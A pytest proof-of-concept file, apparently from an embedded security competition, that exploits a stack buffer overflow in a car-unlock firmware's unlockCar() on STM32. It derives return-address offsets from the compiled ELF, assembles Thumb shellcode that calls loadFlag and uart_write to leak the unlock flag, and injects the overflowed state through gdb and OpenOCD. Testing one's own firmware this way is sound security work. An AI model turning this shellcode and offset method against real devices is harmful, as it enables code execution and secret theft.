"""
Real-hardware proof of concept: car.c's unlockCar() stack buffer overflow,
turned into full arbitrary code execution and flag exfiltration, on real
STM32 hardware.

Skipped by default - it flashes and takes over a specific physical board via
OpenOCD/gdb directly, bypassing the normal deploy() fixture entirely. Run
explicitly:

    pytest test_stack_overflow_poc.py --stack-overflow-poc-probe=<ST-Link serial>

======================================================================
Background / how this was derived (STM32F411, arm-none-eabi-gcc -O2)
======================================================================

The bug (see TestUnlockBufferOverflow in test_security.py for the always-on
regression test): car.c's unlockCar() reads the pre-auth UNLOCK_MAGIC message
into a fixed 64-byte stack buffer via messages.c's receive_board_message():

    message->message_len = uart_readb(BOARD_UART);   // attacker-controlled, 0-255
    uart_read(BOARD_UART, message->buffer, message->message_len);

with zero bounds checking. There's no ASLR/PIE (bare-metal), and this build
config has no -fstack-protector* flag anywhere (see SConstruct), so a big
enough message_len reaches and overwrites unlockCar()'s saved return address
with an attacker-chosen value, and there's no canary to catch it.

unlockCar()'s compiled prologue/epilogue is a fixed shape across rebuilds,
but NOT at fixed exact offsets (frame size and buffer placement shift with
the compiler/optimizer) - see _derive_overflow_offsets() below, which
re-derives everything from the actual compiled ELF instead of hardcoding
numbers from one session's build:

    push {r4, r5, r6, lr}          ; 4 words
    sub  sp, #FRAME_SIZE
    add  rBUF, sp, #BUFFER_OFFSET  ; rBUF = &buffer[64], the overflowed local
    ...
    add  sp, #FRAME_SIZE           ; <-- epilogue: shared by every return path
    pop  {r4, r5, r6, pc}          ; <-- LR (last pushed) is popped directly into PC

Two facts fall out of that shape:

  1. The saved-LR slot sits at buffer-relative offset
     FRAME_SIZE + 12 - BUFFER_OFFSET (140 on the build this was first derived
     against: 176 + 12 - 48). Overwriting those 4 bytes hijacks PC on return.

  2. Because SP is fully restored (sub/add by the same FRAME_SIZE, and the
     same 4 registers pushed/popped) before PC is loaded, the CPU's SP at the
     moment the forged PC takes over is exactly the caller's own SP at the
     `bl unlockCar` call site in main() - a fixed, deterministic address (no
     ASLR). Payload bytes at buffer offset (LR slot + 4) land exactly at that
     address. So: set the forged LR to (that SP value | 1) (Thumb-mode bit),
     and append shellcode starting at that same offset in the same payload -
     no separate hardcoded scratch address needed, the exploit jumps straight
     into its own tail.

Measured live (gdb + OpenOCD, halting the target mid-main-loop and reading
SP - the same SP unlockCar() would see at entry, since main()'s loop makes
every call at the same stack depth): SP = 0x2001FFCC, stable across repeated
halts, on the specific car_31337 STM32 build this was first derived against.
_read_live_sp() below re-measures this fresh against whatever's actually
flashed, rather than trusting that number to still hold.

Because r0-r3 aren't attacker-controlled at the moment PC is hijacked (SP
lands at the popped-to address, but no register setup happens for free), the
payload can't just point PC straight at loadFlag()/uart_write(). The
shellcode instead sets up its own arguments and calls them via absolute
address (blx to a register loaded from a literal pool - a direct `bl` doesn't
reach: the shellcode runs from RAM, ~0x18000000 away from flash, well past
BL's +-16MB range):

    sub  sp, #64          ; carve a scratch dest buffer below current SP
    mov  r4, sp
    mov  r0, r4
    movs r1, #3           ; flag_t UNLOCK == 3 (hardware/include/platform.h)
    ldr  r2, =loadFlag_addr
    blx  r2               ; loadFlag(dest, UNLOCK)
    movs r0, #0           ; HOST_UART == 0
    mov  r1, r4
    movs r2, #64          ; FLAG_SIZE
    ldr  r3, =uartwrite_addr
    blx  r3               ; uart_write(HOST_UART, dest, 64)
hang:
    b hang

loadFlag/uart_write addresses are re-derived per build via `nm` (not
hardcoded) since a TEST_BUILD image strips both `loadFlag` (compiled out
entirely under #ifndef TEST_BUILD) and `sendOK` (never called anywhere
outside the TEST_BUILD command handler, so --gc-sections removes it even
when TEST_BUILD isn't defined) - this PoC therefore requires a non-TEST_BUILD
image, and calls uart_write() directly rather than sendOK() for exactly that
reason.

======================================================================
What this does and doesn't prove
======================================================================

DOES prove: given control of the saved return address and the memory at/
above it - which the raw overflow primitive trivially grants, identically on
sim/tm4c/stm32 (see test_security.py) - execution can be redirected into
shellcode that calls the real, linked loadFlag()/uart_write() and exfiltrates
the real flag. This is real, on-target Cortex-M code execution: this test
writes the crafted bytes directly into the board's live SRAM over SWD and
forces PC to the real compiled epilogue address, then lets the CPU execute
it unmodified.

Does NOT prove wire delivery of this exact payload: delivering it for real
needs two same-platform boards wired together over their board-link UART
(one TEST_BUILD fob to relay the payload via sendBoardMsg, one non-TEST_BUILD
car as the target), and only one ST-Link-equipped STM32 board is available in
this rig. This test injects the already-overflowed state directly instead;
the wire-delivery half of the attack (with an uncontrolled payload, but
sufficient to prove the overflow reaches the return address) is exercised by
test_security.py::TestUnlockBufferOverflow, which runs every time.
"""

import re
import subprocess
import sys
import time
from pathlib import Path

import pytest
import serial

PROJECT_ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(PROJECT_ROOT / "tools"))
import openocd  # noqa: E402

CAR_ID = "319997"  # arbitrary, numeric (SConstruct requires it); distinct from other builds
GDB_PORT = 34449  # non-default: OpenOCD binds 3333 for its gdbserver even during
                  # plain flash-only invocations, so any concurrent OpenOCD use
                  # (e.g. another session flashing a different board) can collide
                  # with the default port.
FLAG_SIZE = 64


def _arm_tool(name: str, *args: str, **kwargs) -> subprocess.CompletedProcess:
    return subprocess.run(["arm-none-eabi-" + name, *args], capture_output=True, text=True, check=True, **kwargs)


def _find_main_loop_top(elf: Path) -> int:
    """Find the address main()'s while(true) loop branches back to.

    Used instead of an untimed 'monitor halt' to read SP: an async halt can
    land mid-instruction inside some nested call (observed directly during
    manual derivation of this PoC - one anomalous SP reading in three
    samples), which is racy. A real breakpoint at an address the loop
    unconditionally executes every iteration gives a precise, non-racy read:
    it can only ever trap at that exact instruction boundary.
    """
    lines = _disasm_lines(elf, "main")
    backward_targets = []
    for line in lines:
        addr = int(re.match(r"\s*([0-9a-f]+):", line).group(1), 16)
        m = re.search(r"\b(?:b|beq|bne|bls|bhi|ble|bgt|blt|bge|cbnz|cbz)(?:\.n|\.w)?\s+(?:r\d+,\s*)?([0-9a-f]+)\s*<", line)
        if m:
            target = int(m.group(1), 16)
            if target < addr:
                backward_targets.append(target)
    assert backward_targets, "Couldn't find main()'s loop-back branch; PoC needs updating"
    return min(backward_targets)


def _nm_symbol(elf: Path, symbol: str) -> int:
    out = _arm_tool("nm", str(elf)).stdout
    for line in out.splitlines():
        parts = line.split()
        if len(parts) == 3 and parts[2] == symbol:
            return int(parts[0], 16)
    raise RuntimeError(f"Symbol {symbol!r} not found in {elf} (TEST_BUILD strips it - build with test=False)")


def _disasm_lines(elf: Path, func: str) -> list[str]:
    out = _arm_tool("objdump", "-d", f"--disassemble={func}", str(elf)).stdout
    return [l for l in out.splitlines() if re.match(r"^\s*[0-9a-f]+:\t", l)]


def _derive_overflow_offsets(elf: Path) -> tuple[int, int, int, int]:
    """Parse unlockCar()'s compiled prologue/epilogue. Returns
    (lr_slot_offset, shellcode_offset, epilogue_addr, sp_locals_delta):
    the first two are relative to the start of the overflowed 64-byte
    buffer, epilogue_addr is absolute, and sp_locals_delta is
    frame_size + pushed_bytes - i.e. sp_entry - sp_locals_delta gives the SP
    value the epilogue's own `add sp, #frame_size` expects to start from
    (needed because this PoC forces PC directly into the middle of the
    epilogue, skipping the `sub sp, #frame_size` that would normally have
    gotten SP there - $sp has to be set explicitly to match, or `add sp,
    #frame_size` operates on the wrong stack entirely).
    Fails loudly if the compiled shape no longer matches what this PoC
    assumes, rather than silently deriving nonsense offsets."""
    lines = _disasm_lines(elf, "unlockCar")

    push_m = re.search(r"push\s*\{([^}]*)\}", lines[0])
    assert push_m and "lr" in push_m.group(1), \
        f"unlockCar's 1st instruction is no longer 'push {{..., lr}}' (got: {lines[0]!r}); PoC needs updating"
    pushed_regs = [r.strip() for r in push_m.group(1).split(",")]

    sub_m = re.search(r"sub\s+sp,\s*#(\d+)", lines[1])
    assert sub_m, f"unlockCar's 2nd instruction is no longer 'sub sp, #N' (got: {lines[1]!r}); PoC needs updating"
    frame_size = int(sub_m.group(1))

    add_m = re.search(r"add\s+r\d+,\s*sp,\s*#(\d+)", lines[2])
    assert add_m, f"unlockCar's 3rd instruction is no longer 'add rX, sp, #N' (got: {lines[2]!r}); PoC needs updating"
    buffer_offset = int(add_m.group(1))

    epilogue_addr = None
    for i in range(len(lines) - 1):
        m1 = re.search(rf"add\s+sp,\s*#{frame_size}\b", lines[i])
        if not m1:
            continue
        m2 = re.search(r"pop\s*\{([^}]*)\}", lines[i + 1])
        if m2 and "pc" in m2.group(1):
            epilogue_addr = int(re.match(r"\s*([0-9a-f]+):", lines[i]).group(1), 16)
            break
    assert epilogue_addr is not None, \
        "Couldn't find unlockCar's 'add sp, #N' / 'pop {..., pc}' epilogue; PoC needs updating"

    pushed_bytes = len(pushed_regs) * 4
    lr_slot_offset = frame_size + pushed_bytes - 4 - buffer_offset
    shellcode_offset = lr_slot_offset + 4
    sp_locals_delta = frame_size + pushed_bytes
    return lr_slot_offset, shellcode_offset, epilogue_addr, sp_locals_delta


def _assemble_shellcode(loadflag_addr: int, uartwrite_addr: int, tmp_path: Path) -> bytes:
    """loadFlag(dest, UNLOCK) then uart_write(HOST_UART, dest, FLAG_SIZE),
    carving its own scratch dest buffer below the SP it starts with. See the
    module docstring for the annotated version of this."""
    src = tmp_path / "shellcode.s"
    obj = tmp_path / "shellcode.o"
    binf = tmp_path / "shellcode.bin"
    src.write_text(f"""\
    .syntax unified
    .thumb
    .text
    .global _start
_start:
    sub  sp, #{FLAG_SIZE}
    mov  r4, sp
    mov  r0, r4
    movs r1, #3
    ldr  r2, ={loadflag_addr | 1:#x}
    blx  r2
    movs r0, #0
    mov  r1, r4
    movs r2, #{FLAG_SIZE}
    ldr  r3, ={uartwrite_addr | 1:#x}
    blx  r3
hang:
    b hang
    .ltorg
""")
    _arm_tool("as", "-mthumb", "-mcpu=cortex-m4", "-o", str(obj), str(src))
    _arm_tool("objcopy", "-O", "binary", str(obj), str(binf))
    return binf.read_bytes()


def _serial_port_for_probe(probe_serial: str) -> str:
    by_id = Path("/dev/serial/by-id")
    for entry in by_id.glob(f"*{probe_serial}*"):
        return str(entry.resolve())
    raise RuntimeError(f"No /dev/serial/by-id entry found for probe {probe_serial}")


def test_unlock_overflow_rce_stm32(request, tmp_path):
    probe = request.config.getoption("--stack-overflow-poc-probe")
    if not probe:
        pytest.skip("pass --stack-overflow-poc-probe=<ST-Link serial> to run this PoC")

    build_dir = PROJECT_ROOT / f"hardware/stm32/build/car_{CAR_ID}"
    elf = build_dir / f"car_{CAR_ID}.elf"

    result = subprocess.run(
        ["scons", "platform=stm32", "role=car", f"id={CAR_ID}", "test=False"],
        cwd=PROJECT_ROOT, capture_output=True, text=True,
    )
    assert result.returncode == 0, f"Build failed:\n{result.stderr}"
    assert elf.exists(), f"Expected ELF not found at {elf}"

    loadflag_addr = _nm_symbol(elf, "loadFlag")
    uartwrite_addr = _nm_symbol(elf, "uart_write")
    unlockcar_addr = _nm_symbol(elf, "unlockCar")
    lr_slot_offset, shellcode_offset, epilogue_addr, sp_locals_delta = _derive_overflow_offsets(elf)
    shellcode = _assemble_shellcode(loadflag_addr, uartwrite_addr, tmp_path)

    print(f"\nloadFlag @ {loadflag_addr:#x}, uart_write @ {uartwrite_addr:#x}, "
          f"unlockCar @ {unlockcar_addr:#x}")
    print(f"LR slot @ buffer+{lr_slot_offset}, shellcode lands @ buffer+{shellcode_offset}, "
          f"epilogue @ {epilogue_addr:#x}, shellcode is {len(shellcode)} bytes")

    rc = openocd.flash("stm32", probe, str(elf))
    assert rc == 0, "Flashing failed"

    serial_port = _serial_port_for_probe(probe)

    openocd_proc = subprocess.Popen(
        ["openocd", "-f", "board/st_nucleo_f4.cfg", "-c", f"adapter serial {probe}",
         "-c", f"gdb_port {GDB_PORT}", "-c", "telnet_port 44490", "-c", "tcl_port disabled"],
        cwd=PROJECT_ROOT, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True,
    )
    try:
        _wait_for_gdbserver(elf)

        ser = serial.Serial(serial_port, 115200, timeout=0.2)
        ser.reset_input_buffer()
        captured = bytearray()

        # --- read the live SP main() uses right before `bl unlockCar` ---
        # (same stack depth as every call in main()'s flat while(true) loop,
        # so any halt point mid-loop gives the same value; see the module
        # docstring.)
        sp_entry = _read_live_sp(elf)
        forged_lr = (sp_entry | 1) & 0xFFFFFFFF

        gdb_script = tmp_path / "exploit.gdb"
        shellcode_path = tmp_path / "shellcode.bin"
        lr_bytes_addr = sp_entry - 4
        shellcode_addr = sp_entry
        sp_locals = sp_entry - sp_locals_delta
        gdb_script.write_text(f"""\
target extended-remote localhost:{GDB_PORT}
monitor reset run
shell sleep 1
monitor halt
print/x $sp
set {{int}}{lr_bytes_addr:#x} = {forged_lr:#x}
restore {shellcode_path} binary {shellcode_addr:#x}
set $pc = {epilogue_addr:#x}
set $sp = {sp_locals:#x}
monitor resume
shell sleep 1.5
monitor halt
print/x $pc
print/x $sp
x/9i {epilogue_addr:#x}
detach
""")

        result = subprocess.run(
            ["gdb-multiarch", "-batch", "-x", str(gdb_script), str(elf)],
            capture_output=True, text=True, timeout=30,
        )
        print(result.stdout)

        deadline = time.monotonic() + 3
        while time.monotonic() < deadline:
            chunk = ser.read(256)
            if chunk:
                captured += chunk
        ser.close()
    finally:
        openocd_proc.terminate()
        try:
            openocd_proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            openocd_proc.kill()

    print(f"Captured {len(captured)} bytes over HOST_UART: {captured!r}")

    flag_defaults_path = build_dir / "flags.bin"
    unlock_flag = flag_defaults_path.read_bytes()[3 * FLAG_SIZE:4 * FLAG_SIZE].split(b"\x00", 1)[0]
    assert unlock_flag, "Couldn't read the expected unlock flag out of flags.bin"
    assert unlock_flag in captured, (
        f"Expected the real unlock flag ({unlock_flag!r}) to be exfiltrated over "
        f"HOST_UART via the shellcode's loadFlag()+uart_write() call, but it "
        f"wasn't found in the captured output."
    )


def _wait_for_gdbserver(elf: Path, timeout: float = 10.0) -> None:
    """Poll until OpenOCD's gdbserver on GDB_PORT actually accepts a
    connection, rather than a fixed sleep - it can take a variable amount of
    time to come up (or contend with another concurrent OpenOCD/probe use)."""
    deadline = time.monotonic() + timeout
    last_output = ""
    while time.monotonic() < deadline:
        result = subprocess.run(
            ["gdb-multiarch", "-batch",
             "-ex", f"target extended-remote localhost:{GDB_PORT}",
             "-ex", "detach",
             str(elf)],
            capture_output=True, text=True, timeout=5,
        )
        last_output = result.stdout + result.stderr
        if "Remote communication error" not in last_output and "Connection refused" not in last_output:
            return
        time.sleep(0.5)
    raise RuntimeError(f"OpenOCD gdbserver on port {GDB_PORT} never came up:\n{last_output}")


def _read_live_sp(elf: Path) -> int:
    """Read the live SP at main()'s loop-top, via a real breakpoint there
    (see _find_main_loop_top) rather than an untimed 'monitor halt' - a
    breakpoint traps at an exact instruction boundary, so this is precise and
    non-racy, unlike sampling async halts (which can land mid-instruction
    inside some nested call, giving a transiently wrong SP - observed
    directly while developing this PoC). Assumes an OpenOCD gdbserver is
    already up on GDB_PORT and the target is running (any boot state - the
    loop-top is reached within microseconds regardless)."""
    loop_top = _find_main_loop_top(elf)
    result = subprocess.run(
        ["gdb-multiarch", "-batch",
         "-ex", f"target extended-remote localhost:{GDB_PORT}",
         "-ex", f"break *{loop_top:#x}",
         "-ex", "continue",
         "-ex", "print/x $sp",
         "-ex", "delete",
         "-ex", "detach",
         str(elf)],
        capture_output=True, text=True, timeout=15,
    )
    m = re.search(r"\$1 = (0x[0-9a-f]+)", result.stdout)
    assert m, f"Couldn't read live SP via gdb; output was:\n{result.stdout}\n{result.stderr}"
    return int(m.group(1), 16)
